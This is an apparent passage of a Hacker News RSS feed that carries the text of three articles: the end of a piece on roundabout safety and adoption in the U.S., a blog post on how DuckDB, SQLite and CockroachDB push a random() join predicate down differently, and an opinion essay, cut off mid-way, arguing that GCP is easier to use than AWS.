<p>Roundabouts likely caught on so quickly because they reduce the number of <a href="https://www.transportation.ohio.gov/about-us/basics/roundabouts">potential conflict points</a>. A conflict point at an intersection is a location where the paths of two or more vehicles or road users cross or have the potential to cross. The more conflict points, the more likely vehicles are to crash.</p>

<p>A roundabout has only eight potential conflict points, compared to 32 at <a href="https://www.transportation.ohio.gov/about-us/basics/roundabouts">a conventional four-way intersection</a>. At roundabouts, vehicles don’t cross each other at a right angle, and there are fewer points where vehicles merge or diverge into or away from each other.</p>

<p>The roundabout’s tight circle forces approaching traffic to slow down and yield to circulating traffic, and then move smoothly around the central island. As a result, roundabouts have <a href="https://www.iihs.org/topics/roundabouts#safety-benefits">fewer stop-and-go issues</a>, which reduces fuel consumption and vehicle emissions and allows drivers to perform U-turns more easily. Since traffic flows continuously at lower speeds in a roundabout, this continuous flow minimizes the need for vehicles to stop, which reduces congestion. </p>

<p>The Federal Highway Administration estimates that when a roundabout replaces a stop sign-controlled intersection, it reduces serious and fatal injury crashes <a href="https://www.transportation.ohio.gov/about-us/basics/roundabouts">by 90%</a>, and when it replaces an intersection with a traffic light, it reduces serious and fatal injury crashes <a href="https://www.transportation.ohio.gov/about-us/basics/roundabouts">by nearly 80%</a>.</p>

<h2>Why do some places have more than others?</h2>

<p>Engineers and planners traditionally have installed roundabouts in intersections with <a href="https://www.in.gov/indot/traffic-engineering/roundabouts/">severe congestion or a history of accidents</a>. But, with public support and funding, they can get installed anywhere.</p>

<figure>
            <p><iframe data-src="https://www.youtube.com/embed/6OGvj7GZSIo?wmode=transparent&amp;start=0" frameborder="0" allowfullscreen="" width="100%" height="400"></iframe></p>
            <figcaption><span>For some traffic engineers, the sky’s the limit.</span></figcaption>
          </figure>

<p>But roundabouts aren’t needed in every intersection. In places where congestion isn’t an issue, city planners <a href="https://www.bridlevehicleleasing.co.uk/blog/why-doesnt-america-have-roundabouts">tend not to push for them</a>. For example, while there are [around 750 roundabouts] in Florida, there are fewer than 50 in <a href="https://www.dot.nd.gov/projects/roundabout/roundabout.htm">North Dakota</a>, <a href="https://www.keloland.com/keloland-com-original/more-roundabouts-possible-in-sioux-falls/">South Dakota</a> and <a href="https://www.dot.state.wy.us/home/news_info/roundabouts.html">Wyoming</a> combined. </p>

<p>Roundabouts have been <a href="https://www.iihs.org/topics/roundabouts#safety-benefits">gaining popularity</a> in the U.S. in recent years, in part because the <a href="https://highways.dot.gov/safety/proven-safety-countermeasures">Federal Highway Administration recommends them</a> as the safest option. Some states, like New York and Virginia, have adopted a “roundabout first” policy, where engineers default to using roundabouts where feasible when building or upgrading intersections. </p>

<p>In 2000, the U.S. <a href="https://www.washingtonpost.com/business/2022/11/25/roundabout-revolution-traffic-circles/">only had 356 roundabouts</a>. Over the past two decades, that number has <a href="https://roundabouts.kittelson.com/">grown to over 10,000</a>. Love them or hate them, the roundabout’s widespread adoption suggests that these circular intersections are here to stay.</p>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Case of a Curious SQL Query (165 pts)]]></title>
            <link>https://buttondown.email/jaffray/archive/the-case-of-a-curious-sql-query/</link>
            <guid>38016930</guid>
            <pubDate>Wed, 25 Oct 2023 19:10:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://buttondown.email/jaffray/archive/the-case-of-a-curious-sql-query/">https://buttondown.email/jaffray/archive/the-case-of-a-curious-sql-query/</a>, See on <a href="https://news.ycombinator.com/item?id=38016930">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

                

                
                    
                        <p>Languages that suffer success often have to do so by selling out and adding features that go against some of the original purposes of their design.</p>
<p>SQL is a great example of a language built on very solid foundations: it comes from the idea that we should define an algebra for data retrieval, and then we can formally define how that algebra should behave, and then we can have a common tongue between humans who want to query databases and databases who want to execute CPU instructions.</p>
<p>This is the kind of thing that excites people who implement query engines and are conflict averse because it creates an authoritative source for how queries should behave. We've formally defined what it means for this given operator to run, so if there's any dispute, we have the technology to figure out what the result "should be."</p>
<p>This is particularly nice in the presence of optimizing such queries. For example, "predicate pushdown" is a well-known optimization which says that if I have a predicate on an inner join that only references columns from one of its arms, I can push it down into one of those arms and reduce the size of the data I have to join:</p>
<div><pre><span></span><code><span>SELECT</span> <span>*</span> <span>FROM</span> <span>abc</span> <span>INNER</span> <span>JOIN</span> <span>def</span> <span>ON</span> <span>abc.a</span> <span>=</span> <span>def.d</span> <span>AND</span> <span>abc.b</span> <span>=</span> <span>4</span>
</code></pre></div>

<p>can become</p>
<div><pre><span></span><code><span>SELECT</span> <span>*</span> <span>FROM</span> <span>(</span><span>SELECT</span> <span>*</span> <span>FROM</span> <span>abc</span> <span>WHERE</span> <span>abc.b</span> <span>=</span> <span>4</span><span>)</span> <span>INNER</span> <span>JOIN</span> <span>def</span> <span>ON</span> <span>abc.a</span> <span>=</span> <span>def.d</span>
</code></pre></div>

<p>Which may or may not be hard to convince yourself of, but if you have formal definitions of what a join is laid out in front of you, it becomes very obvious that this is correct.</p>
<p>Things like this got messier when people actually started <em>using</em> these languages and started caring about properties (say, the order of a result set) of a relational query that the original model didn't have a notion of. Of course, that one is fairly easily resolved, but it is sometimes more difficult, and we get back into the realm of ambiguity.</p>
<p>Here is my favourite SQL query:</p>
<div><pre><span></span><code><span>SELECT</span> <span>count</span><span>(</span><span>*</span><span>)</span> <span>FROM</span> <span>one_thousand</span> <span>INNER</span> <span>JOIN</span> <span>one_thousand</span> <span>ON</span> <span>random()</span> <span>&lt;</span> <span>0</span><span>.</span><span>5</span>
</code></pre></div>

<p>Where <code>one_thousand</code> is a single column table of the numbers 0, 1, ... 999.</p>
<p>What number do we expect to see from this query? To me, intuitively, it seems like we should be evaluating this predicate on each pair of rows from the two inputs, so we'd expect to get about half of them, so we should see about ~500000 rows. And if we run this in DuckDB, that's indeed more or less what we see:</p>
<div><pre><span></span><code>D SELECT count(*) FROM one_thousand a INNER JOIN one_thousand b ON random() &lt; 0.5;
┌──────────────┐
│ count_star() │
├──────────────┤
│ 499910       │
└──────────────┘
D SELECT count(*) FROM one_thousand a INNER JOIN one_thousand b ON random() &lt; 0.5;
┌──────────────┐
│ count_star() │
├──────────────┤
│ 499739       │
└──────────────┘
D SELECT count(*) FROM one_thousand a INNER JOIN one_thousand b ON random() &lt; 0.5;
┌──────────────┐
│ count_star() │
├──────────────┤
│ 500054       │
└──────────────┘
D
</code></pre></div>

<p>I ran this query 1000 times, and the mean result was 500011.6034, hovering right around the expected mean of 500000.</p>
<p>We should expect these results to be binomially distributed, and if we plot a histogram of a bunch of runs, that's basically what we see:
 <img alt="image.png" src="https://buttondown.imgix.net/images/7ba49cec-d8b6-4e4f-b4c4-5767ac911358.png?w=960&amp;fit=max"> </p>
<p>Let's try a different database, SQLite:</p>
<div><pre><span></span><code><span>sqlite</span><span>&gt;</span> <span>select</span> <span>count</span><span>(</span><span>*</span><span>)</span> <span>from</span> <span>one_thousand</span> <span>a</span> <span>inner</span> <span>join</span> <span>one_thousand</span> <span>b</span> <span>on</span> <span>random()</span> <span>&lt;</span> <span>0</span><span>.</span><span>5</span><span>;</span>
<span>511000</span>
</code></pre></div>

<p>Looks pretty reasonable. Doing another 10000 trials, we get a mean of 499865.8, which seems like we're getting the same behaviour as DuckDB. Now let's plot those 10000 trials in a histogram:
 <img alt="image.png" src="https://buttondown.imgix.net/images/86611e07-5f63-4483-8dc2-2670abd32d4d.png?w=960&amp;fit=max"> </p>
<p>Hm! Looks suspiciously different than DuckDB! Not only are the points much more sparse, the variance of the distribution is also much higher. What's going on here? SQLite plans are unfortunately not the most enlightening:</p>
<div><pre><span></span><code><span>sqlite</span><span>&gt;</span> <span>explain</span> <span>select</span> <span>count</span><span>(</span><span>*</span><span>)</span> <span>from</span> <span>one_thousand</span> <span>a</span> <span>inner</span> <span>join</span> <span>one_thousand</span> <span>b</span> <span>on</span> <span>random()</span> <span>&lt;</span> <span>0</span><span>.</span><span>5</span><span>;</span>
<span>addr</span>  <span>opcode</span>         <span>p1</span>    <span>p2</span>    <span>p3</span>    <span>p4</span>             <span>p5</span>  <span>comment</span>
<span>----  -------------  ----  ----  ----  -------------  --  -------------</span>
<span>0</span>     <span>Init</span>           <span>0</span>     <span>17</span>    <span>0</span>                    <span>0</span>   <span>Start</span> <span>at</span> <span>17</span>
<span>1</span>     <span>Null</span>           <span>0</span>     <span>1</span>     <span>1</span>                    <span>0</span>   <span>r[</span><span>1</span><span>..</span><span>1</span><span>]</span><span>=</span><span>NULL</span>
<span>2</span>     <span>OpenRead</span>       <span>0</span>     <span>2</span>     <span>0</span>     <span>0</span>              <span>0</span>   <span>root</span><span>=</span><span>2</span> <span>iDb</span><span>=</span><span>0</span><span>;</span> <span>one_thousand</span>
<span>3</span>     <span>OpenRead</span>       <span>1</span>     <span>2</span>     <span>0</span>     <span>0</span>              <span>0</span>   <span>root</span><span>=</span><span>2</span> <span>iDb</span><span>=</span><span>0</span><span>;</span> <span>one_thousand</span>
<span>4</span>     <span>Explain</span>        <span>4</span>     <span>0</span>     <span>0</span>     <span>SCAN</span> <span>a</span>         <span>0</span>
<span>5</span>     <span>Rewind</span>         <span>0</span>     <span>13</span>    <span>0</span>                    <span>0</span>
<span>6</span>       <span>Function</span>       <span>0</span>     <span>0</span>     <span>2</span>     <span>random(</span><span>0</span><span>)</span>      <span>0</span>   <span>r[</span><span>2</span><span>]</span><span>=</span><span>func()</span>
<span>7</span>       <span>Ge</span>             <span>3</span>     <span>12</span>    <span>2</span>                    <span>80</span>  <span>if</span> <span>r[</span><span>2</span><span>]</span><span>&gt;=</span><span>r[</span><span>3</span><span>]</span> <span>goto</span> <span>12</span>
<span>8</span>       <span>Explain</span>        <span>8</span>     <span>0</span>     <span>0</span>     <span>SCAN</span> <span>b</span>         <span>0</span>
<span>9</span>       <span>Rewind</span>         <span>1</span>     <span>13</span>    <span>0</span>                    <span>0</span>
<span>10</span>        <span>AggStep</span>        <span>0</span>     <span>0</span>     <span>1</span>     <span>count</span><span>(</span><span>0</span><span>)</span>       <span>0</span>   <span>accum</span><span>=</span><span>r[</span><span>1</span><span>]</span> <span>step(r[</span><span>0</span><span>])</span>
<span>11</span>      <span>Next</span>           <span>1</span>     <span>10</span>    <span>0</span>                    <span>1</span>
<span>12</span>    <span>Next</span>           <span>0</span>     <span>6</span>     <span>0</span>                    <span>1</span>
<span>13</span>    <span>AggFinal</span>       <span>1</span>     <span>0</span>     <span>0</span>     <span>count</span><span>(</span><span>0</span><span>)</span>       <span>0</span>   <span>accum</span><span>=</span><span>r[</span><span>1</span><span>]</span> <span>N</span><span>=</span><span>0</span>
<span>14</span>    <span>Copy</span>           <span>1</span>     <span>4</span>     <span>0</span>                    <span>0</span>   <span>r[</span><span>4</span><span>]</span><span>=</span><span>r[</span><span>1</span><span>]</span>
<span>15</span>    <span>ResultRow</span>      <span>4</span>     <span>1</span>     <span>0</span>                    <span>0</span>   <span>output</span><span>=</span><span>r[</span><span>4</span><span>]</span>
<span>16</span>    <span>Halt</span>           <span>0</span>     <span>0</span>     <span>0</span>                    <span>0</span>
<span>17</span>    <span>Transaction</span>    <span>0</span>     <span>0</span>     <span>1</span>     <span>0</span>              <span>1</span>   <span>usesStmtJournal</span><span>=</span><span>0</span>
<span>18</span>    <span>Real</span>           <span>0</span>     <span>3</span>     <span>0</span>     <span>0</span><span>.</span><span>5</span>            <span>0</span>   <span>r[</span><span>3</span><span>]</span><span>=</span><span>0</span><span>.</span><span>5</span>
<span>19</span>    <span>Goto</span>           <span>0</span>     <span>1</span>     <span>0</span>                    <span>0</span>
</code></pre></div>

<p>But what's going on here becomes a bit more obvious if we look at a few more sample results of our query:</p>
<div><pre><span></span><code><span>sqlite</span><span>&gt;</span> <span>select</span> <span>count</span><span>(</span><span>*</span><span>)</span> <span>from</span> <span>one_thousand</span> <span>a</span> <span>inner</span> <span>join</span> <span>one_thousand</span> <span>b</span> <span>on</span> <span>random()</span> <span>&lt;</span> <span>0</span><span>.</span><span>5</span><span>;</span>
<span>481000</span>
<span>sqlite</span><span>&gt;</span> <span>select</span> <span>count</span><span>(</span><span>*</span><span>)</span> <span>from</span> <span>one_thousand</span> <span>a</span> <span>inner</span> <span>join</span> <span>one_thousand</span> <span>b</span> <span>on</span> <span>random()</span> <span>&lt;</span> <span>0</span><span>.</span><span>5</span><span>;</span>
<span>486000</span>
<span>sqlite</span><span>&gt;</span> <span>select</span> <span>count</span><span>(</span><span>*</span><span>)</span> <span>from</span> <span>one_thousand</span> <span>a</span> <span>inner</span> <span>join</span> <span>one_thousand</span> <span>b</span> <span>on</span> <span>random()</span> <span>&lt;</span> <span>0</span><span>.</span><span>5</span><span>;</span>
<span>503000</span>
<span>sqlite</span><span>&gt;</span> <span>select</span> <span>count</span><span>(</span><span>*</span><span>)</span> <span>from</span> <span>one_thousand</span> <span>a</span> <span>inner</span> <span>join</span> <span>one_thousand</span> <span>b</span> <span>on</span> <span>random()</span> <span>&lt;</span> <span>0</span><span>.</span><span>5</span><span>;</span>
<span>518000</span>
</code></pre></div>

<p>They're notably all divisible by 1000. Recall the query transformation we opened with:</p>
<div><pre><span></span><code><span>SELECT</span> <span>*</span> <span>FROM</span> <span>abc</span> <span>INNER</span> <span>JOIN</span> <span>def</span> <span>ON</span> <span>abc.a</span> <span>=</span> <span>def.d</span> <span>AND</span> <span>abc.b</span> <span>=</span> <span>4</span>
<span>=&gt;</span>
<span>SELECT</span> <span>*</span> <span>FROM</span> <span>(</span><span>SELECT</span> <span>*</span> <span>FROM</span> <span>abc</span> <span>WHERE</span> <span>abc.b</span> <span>=</span> <span>4</span><span>)</span> <span>INNER</span> <span>JOIN</span> <span>def</span> <span>ON</span> <span>abc.a</span> <span>=</span> <span>def.d</span>
</code></pre></div>

<p>This optimization is valid because <code>abc.b = 4</code> doesn't use any of the columns from <code>def</code>, so we can push it down and evaluate it directly on <code>abc</code>.</p>
<p>In this query:</p>
<div><pre><span></span><code><span>select</span> <span>count</span><span>(</span><span>*</span><span>)</span> <span>from</span> <span>one_thousand</span> <span>a</span> <span>inner</span> <span>join</span> <span>one_thousand</span> <span>b</span> <span>on</span> <span>random()</span> <span>&lt;</span> <span>0</span><span>.</span><span>5</span><span>;</span>
</code></pre></div>

<p><code>random() &lt; 0.5</code> doesn't depend on any columns in <code>one_thousand</code>, and so SQLite concludes that it's valid to transform the query to something like:</p>
<div><pre><span></span><code><span>SELECT</span> <span>count</span><span>(</span><span>*</span><span>)</span> <span>FROM</span>
  <span>(</span><span>SELECT</span> <span>*</span> <span>FROM</span> <span>one_thousand</span> <span>WHERE</span> <span>random()</span> <span>&lt;</span> <span>0</span><span>.</span><span>5</span><span>)</span>
    <span>INNER</span> <span>JOIN</span>
  <span>one_thousand</span> 
    <span>ON</span> <span>true</span><span>;</span>
</code></pre></div>

<p>Which, since the right side of this join has exactly 1000 rows, will always result in a number divisible by 1000.</p>
<p>For a final example, let's look at CockroachDB (disclosure, disclosure, former employer, used to work on the query optimizer specifically).</p>
<p>Doing 10000 trials of our query in CockroachDB, we get a mean of 249889.969(!) and the following distribution:</p>
<p><img alt="image.png" src="https://buttondown.imgix.net/images/29467364-f2c6-4391-88a4-47e36519a80e.png?w=960&amp;fit=max"></p>
<p>You might be able to guess what's going on here. Here's an <code>EXPLAIN</code> plan for the query:</p>
<div><pre><span></span><code>                              <span>info</span>
<span>----------------------------------------------------------------</span>
 <span>•</span> <span>group</span> <span>(scalar)</span>
 <span>└──</span> <span>•</span> <span>cross</span> <span>join</span>
     <span>├──</span> <span>•</span> <span>filter</span>
     <span>│</span>   <span>│</span> <span>filter:</span> <span>random()</span> <span>&lt;</span> <span>0</span><span>.</span><span>5</span>
     <span>│</span>   <span>└──</span> <span>•</span> <span>scan</span>
     <span>└──</span> <span>•</span> <span>filter</span>
         <span>│</span> <span>filter:</span> <span>random()</span> <span>&lt;</span> <span>0</span><span>.</span><span>5</span>
         <span>└──</span> <span>•</span> <span>scan</span>
</code></pre></div>

<p>Aha! CockroachDB notes that <code>random() &lt; 0.5</code> isn't bound by <em>either</em> side of the join, and so we can push it down into <em>both</em> sides. Now we are effectively performing this filter twice for each eventual output row, and thus we end up with about 25% of the rows in the final output. You'll also notice it's much spikier than the other ones, with more outliers, I suppose this is partly because this execution plan means we are more likely to output numbers which are more composite than ones which are closer to being prime.</p>
<p>As one last example, in some SQL dialects there is a "set returning function" called <code>generate_series</code> which can be used to construct tables like <code>one_thousand</code>. In CockroachDB:</p>
<div><pre><span></span><code><span>defaultdb</span><span>=&gt;</span> <span>select</span> <span>*</span> <span>from</span> <span>generate_series(</span><span>0</span><span>,</span> <span>999</span><span>);</span>
 <span>generate_series</span>
<span>-----------------</span>
               <span>0</span>
               <span>1</span>
               <span>2</span>
             <span>...</span>
             <span>999</span>
</code></pre></div>

<p>We can again construct our query but using this function instead of a reference to an explicit table:</p>
<div><pre><span></span><code><span>select</span> <span>count</span><span>(</span><span>*</span><span>)</span> <span>from</span>
  <span>generate_series(</span><span>0</span><span>,</span><span>999</span><span>)</span> <span>a</span>
    <span>inner</span> <span>join</span>
  <span>generate_series(</span><span>0</span><span>,</span><span>999</span><span>)</span>
    <span>on</span> <span>random()</span> <span>&lt;</span> <span>0</span><span>.</span><span>5</span>
</code></pre></div>

<p>Running 10000 trials of this, I got a mean of 241700.0.
Surprisingly far from the expected mean!
Plotting the histogram shows us why:</p>
<p><img alt="image.png" src="https://buttondown.imgix.net/images/fd729971-66b7-43b0-a427-9437fb039c36.png?w=960&amp;fit=max"> </p>
<p>~75% of the results were 0, and ~25% were 1000000. To see why, we can look at the <code>EXPLAIN</code>:</p>
<div><pre><span></span><code>                 info
---------------------------------------
 • group (scalar)
 └── • cross join
     ├── • cross join
     │   ├── • project set
     │   │   └── • emptyrow
     │   └── • filter: random() &lt; 0.5
     │       └── • emptyrow
     └── • cross join
         ├── • project set
         │   └── • emptyrow
         └── • filter: random() &lt; 0.5
             └── • emptyrow
</code></pre></div>

<p>For reasons that aren't apparent in this simple example, these <code>generate_series</code> get planned as joins against some input. In this case, the input is just the unit row (zero columns, one row) named "emptyrow" in this plan.</p>
<p>For our query, the <code>random() &lt; 0.5</code> filter gets pushed down both sides <em>all the way</em> to this unit row. Where on any execution, it either gets filtered or not.
So if you win both coin flips, you get the full output, otherwise, you get nothing.</p>
<p>Is any of this a particularly important consideration? Eh. No. I dunno. Not really. I don't think you could make a particularly compelling claim that any of these behaviours are <em>wrong</em>. I don't know what, if anything, the SQL spec has to say on this, but I think the industry generally seems to agree that's more of a gentle suggestion than anything resembling a "standard."</p>
<p>This kind of thing (impure functions in a declarative language, specifically) does cause <em>actual</em> problems in other contexts, which we will talk about someday, but for now I think it's a fun little mind bender that gives you some insight into the internals of these databases query engines without having to actually look at any code.</p>
                    
                

                
            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I think GCP is better than AWS (2020) (231 pts)]]></title>
            <link>https://nandovillalba.medium.com/why-i-think-gcp-is-better-than-aws-ea78f9975bda</link>
            <guid>38016849</guid>
            <pubDate>Wed, 25 Oct 2023 19:01:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nandovillalba.medium.com/why-i-think-gcp-is-better-than-aws-ea78f9975bda">https://nandovillalba.medium.com/why-i-think-gcp-is-better-than-aws-ea78f9975bda</a>, See on <a href="https://news.ycombinator.com/item?id=38016849">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><h2 id="36c3">AWS is the best platform to showcase how great GCP is…</h2><div><a rel="noopener follow" href="https://nandovillalba.medium.com/"><div aria-hidden="false"><p><img alt="Fernando Villalba" src="https://miro.medium.com/v2/resize:fill:88:88/2*xEX2cPxo4eaKN9uOXHVDrA.jpeg" width="44" height="44" loading="lazy" data-testid="authorPhoto"></p></div></a></div></div><figure></figure><blockquote><p id="822e">I originally posted this on <a href="https://www.reddit.com/r/devops/comments/ge79zy/let_me_tell_you_why_i_think_gcp_is_better_than/?sort=top" rel="noopener ugc nofollow" target="_blank">Reddit</a> so I could get a good sample of opinions from other engineers to see how they compared to mine before posting and expanding here. This is my opinion based on my experience with both platforms (two years in each). My bias towards GCP is mostly based on the superior experience I have gotten with it and I am in no way affiliated with Google. AWS is still my second choice as an enterprise option for cloud platform and it would be nice for them to do better. I welcome your comments and corrections, especially if they are informed and constructive, I am happy to learn from you.</p></blockquote><h2 id="2cb0">Ikea for Cars</h2><p id="c587">If AWS (Amazon Web Services) and GCP (Google Cloud Platform) were both car companies and you wanted to purchase a car, AWS would give you the wheel, a chunky verbose manual and the keys and then tell you to go to twenty different shops they also own to get the rest of the components to put them together yourself the best you can. Sure, maybe you can hire a service and get tools to automate this part, but it still falls on you to assemble these components together and maintain the automation.</p><p id="82ea">The experience of GCP on the other hand is more like collecting the car keys and driving off from the parking lot, with the option of dismantling and customising the car if you wish, but the default is a fully built functioning car with cohesive parts so you can quickly achieve your objectives, which is driving around, not assemble the car.</p><p id="5136">My first experience working with AWS, before I had much to compare it to, was brief and I didn’t like it; I felt the interface and the way tools and settings were organised was counter-intuitive and weird.</p><p id="def2">For example assigning a static ip to a server was just bizarre, I kept looking for ways to assign the static ip without knowing that it was meant to be called elastic ip and hidden away in a separate set of menus. These elastic ips were part of a different pool of ips than the ones that were assigned dynamically, so I had to stop a production server to change the ip and also change the DNS pointing to that new ip, this was because my predecessor hadn’t assigned an static ip to the server, my bet is that he probably gave up after ten minutes trying to figure out that it was called an elastic ip.</p><p id="f03c">My second experience working with AWS was after a year and a half working with GCP, and now by comparison I really couldn’t stand AWS, it took me a few months to get accustomed back to use it and I remember that in my first few weeks I actually considered quitting and just accepting GCP roles.</p><p id="cda8">It’s not that AWS is harder to use than GCP, it’s that it is needlessly hard; a disjointed, sprawl of infrastructure primitives with poor cohesion between them. A challenge is nice, a confusing mess is not, and the problem with AWS is that a large part of your working hours will be spent untangling their documentation and weeding through features and products to find what you want, rather than focusing on cool interesting challenges.</p><p id="0d4f">Let’s just go over a few of the things that make AWS such a pain to use and how it compares with GCP.</p><h2 id="fa1e">Accounts vs Projects</h2><p id="c31d">One of the first differences that strikes you when going from GCP to AWS is accounts vs projects. In GCP you have one master account/project that you can use to manage the rest of your projects, you log in with your company google account and then you can set permissions to any project however you want. So you can have a dev project, a production project, etc. All of this works out of the box and there is absolutely nothing additional for you to do.</p><p id="2dac">In AWS you have accounts, and each account has a separate set of users. There are ways to connect these accounts so your user has permissions on other accounts. One way of doing this is creating a master users account and then adding roles that can be assumed in all other accounts by this master account.</p><p id="c341">This is not only a pain to set up, it’s very painful to use as well. For example when using terraform scripts you need to coordinate multiple roles across several modules if you need to work across multiple accounts.</p><p id="ac3d"><strong>Command Line Interface Tools (CLI tools)</strong></p><p id="67bb">Let’s just compare what you have to do in order to use GCP cli compared to AWS provided we are using 2FA and a couple of different projects/accounts.</p><p id="40e3">In GCP after you <a href="https://cloud.google.com/sdk/docs/quickstart-linux" rel="noopener ugc nofollow" target="_blank">install the Google SDK</a>, all you need to do is run gcloud init, which redirects you in the browser to a Google login page. Here you can login with your 2FA (which if you have an android phone is as easy as unlocking the phone and pressing okay) and you are done. Your login session is attached to your Google session so when you kill this session you are logged out— very simple.</p><p id="2fce">In AWS you need to create a token that you can use to login with your CLI, simple enough, right? But now we want to use 2FA, and this is where the fun begins.</p><p id="afc8">After you login with your token you then need to <a href="https://github.com/asagage/aws-mfa-script" rel="noopener ugc nofollow" target="_blank">create a script</a> to give you a 12 hour session, and you need to do this every day, because there is no way to extend this.</p><p id="b05e">Okay, but that’s not a big deal, you say, after all it’s just a code that you need to input once a day and you can get on with your day after that.</p><p id="6f39">But wait, there is more! If you need to assume roles in another account, you need to create yet <a href="https://github.com/Integralist/Shell-Scripts/blob/master/aws-cli-assumerole.sh" rel="noopener ugc nofollow" target="_blank">another script</a> that creates another profile for you to use.</p><p id="fd75">That’s one step plus two scripts, plus many steps in between. And sure, you can automate much of this or use someone else’s tools you find online (that you most likely will need to tweak), but why? Why do we have to do so much work to use AWS? Why can’t AWS abstract away this pain away from you in the way that Google has done?</p><h2 id="77a8">Web User Interface</h2><p id="6750">If using the CLI is too painful for you, you can always log in to the portal and use their user interface, although I don’t recommend you do this for everything, in fact I recommend you use it the least possible and only for reference and to check status of your services, always do infrastructure as code as much as you can</p><p id="c0c4">The AWS interface looks like it was designed by a lonesome alien living in an asteroid who once saw a documentary about humans clicking with a mouse. It is confusing, counterintuitive, messy and extremely overcrowded.</p><p id="fc51">I can’t even count the times I’ve gotten lost or stumped in the AWS console, sometimes over the most stupid details, like missing that there was a next button hidden on a weird corner. Or trying to use search bars that can only search prefixes (WTF?)</p><p id="2b02">But the biggest frustration I have from the AWS console is how you are always overwhelmed with scores of settings and options you need to fill in before actually provisioning anything.</p><p id="4833">One example that comes to mind is when someone at work said we should use codebuild/codedeploy to replace Jenkins for ECS deployments. The first engineer tried, he got stuck, the second engineer tried, he got stuck, I tried for hours and I got stuck… in the end I just gave up for lack of wanting to spend any more time on a tool that doesn’t seem to be that popular for CI/CD that I thought was meant to make life easier.</p><p id="7155">Amazon seems to be particularly terrible at interfaces in almost all of their products though. For example in my Smart TV the Netflix app works flawlessly and is intuitive to use whereas the Amazon Prime app is an abomination, you are constantly accidentally pressing the wrong button or getting lost or the subtitles are often out of sync.</p><p id="e1ba">In a rant that a Google engineer who had worked at Amazon <a href="https://gist.github.com/chitchcock/1281611" rel="noopener ugc nofollow" target="_blank">wrote a while back</a> he explained the issue with Amazon and Bezos not understanding interfaces (or is it human interaction?) like this:</p><blockquote><p id="a3f1">Jeff Bezos is an infamous micro-manager. He micro-manages every single pixel of Amazon’s retail site. He hired Larry Tesler, Apple’s Chief Scientist and probably the very most famous and respected human-computer interaction expert in the entire world, and then ignored every goddamn thing Larry said for three years until Larry finally — wisely — left the company. Larry would do these big usability studies and demonstrate beyond any shred of doubt that nobody can understand that frigging website, but Bezos just couldn’t let go of those pixels, all those millions of semantics-packed pixels on the landing page. They were like millions of his own precious children. So they’re all still there, and Larry is not.</p></blockquote><p id="21e7">GCP’s user interface is on the other hand very intuitive to use and whenever you want to provision anything you are given <a href="https://en.wikipedia.org/wiki/Convention_over_configuration" rel="noopener ugc nofollow" target="_blank">sane defaults</a> so you can deploy anything in a couple of clicks, I have never gotten lost using GCP or needed to consult a million pages of documentation to find out what I needed to do.</p><p id="854e">This however does not mean that GCP is taking away from you the power to configure things to an intricate detail, it just means they are giving you an example of a working configuration that you can then tweak to your purposes.</p><p id="2dfe">There are also other things you can do from the UI in GCP that either work really badly in AWS or are non-existent. For example you can easily open a terminal and ssh into any instance you have spun (provided you set permissions for it) and it works really well.</p><p id="f5a1">Another feature you have in GCP that I absolutely LOVE is the ability to view the CLI command that would do whatever settings you have in the console. That makes learning the cli so much easier, it’s far better than scouring the net for examples on how to do anything or trying to make sense of AWS’s gorgeous documentation…</p><h2 id="c506">Documentation</h2><figure></figure><p id="b52b">You can forgive the documentation in AWS being a nightmare to navigate for being a mere reflection of the confusing mess that is trying to describe. Whenever you are trying to solve a simple problem far too often you end up drowning in reference pages, the experience is like asking for a glass of water and being hosed down with a fire hydrant.</p><p id="3905">Great documentation is contextual, not referential. If you wanted to learn how to cook a dish, you don’t want someone to point you to a list of ingredients, you want a recipe describing how to use them, and this is where AWS documentation too often fails; it exhaustively describes everything that they have (which is not bad), but they don’t always do a good job at putting the documentation into context.</p><p id="9b26">To be perfectly fair to whoever is tasked to document anything in AWS, it is a lot harder to document something that’s confusing and messy than something that’s simple to use. Extensive and overly verbose documentation is often a sign of complicated and over convoluted software or processes, so in this sense Google Cloud already has an advantage to begin with.</p><p id="23fa">The big problem here is not that AWS doesn’t document enough, in fact it may even document more than GCP, the problem is that documentation is not a substitute for automation. Take <a href="https://docs.aws.amazon.com/eks/latest/userguide/aws-load-balancer-controller.html" rel="noopener ugc nofollow" target="_blank">this example</a> of long document (that leads to many other documents) telling you how to deploy the alb controller in EKS. All of this incredibly long and tedious process should have been automated by AWS so when you run EKS you can opt whether to have this controller installed or not with a tick box or a cli parameter or an extra option in terraform, as it’s the case in GCP. Instead AWS forces you to go through this lengthy documentation and put this together yourself, which can easily take you a day or more if you want to test and understand everything thoroughly.</p><p id="db60">The documentation in GCP is generally more clear and concise because they don’t need to teach you how to build everything from scratch like the above example, and while it may not always be perfect I generally found it useful and to the point. If you want other good examples of great documentation look at DigitalOcean — they are great.</p><h2 id="0612">GKE vs EKS</h2><p id="7481">If your intent is to use Kubernetes, don’t even bother with AWS, their implementation is so bad I can’t even comprehend how they have the gall to call it managed, especially when compared with GCP</p><p id="7647">In GCP if you want to spin a cluster, no problem, just a couple of clicks and you are there. The defaults are easy and sane and the entire product feels very cohesive with all the ugly, tedious bits abstracted away from your experience.</p><p id="903c">With GKE you don’t need to join the nodes, you don’t need to plan or automate for an upgrade of these nodes either, or go through <a href="https://docs.aws.amazon.com/eks/latest/userguide/aws-load-balancer-controller.html" rel="noopener ugc nofollow" target="_blank">this abomination</a> to use ingress, it’s done automatically or with a couple of easy clicks, and this does not mean you are sacrificing complexity. You can customise a lot, but when presented with sane, simple defaults, it’s a lot easier to understand a product that when being overwhelmed with a barrage of options and trying to figure out how everything fits together as it’s the case with EKS.</p><p id="fbf4">̶S̶p̶i̶n̶n̶i̶n̶g̶ ̶a̶n̶ ̶E̶K̶S̶ ̶c̶l̶u̶s̶t̶e̶r̶ ̶g̶i̶v̶e̶s̶ ̶y̶o̶u̶ ̶e̶s̶s̶e̶n̶t̶i̶a̶l̶l̶y̶ ̶a̶ ̶b̶r̶i̶c̶k̶.̶ ̶Y̶o̶u̶ ̶h̶a̶v̶e̶ ̶t̶o̶ ̶s̶p̶i̶n̶ ̶y̶o̶u̶r̶ ̶o̶w̶n̶ ̶n̶o̶d̶e̶s̶ 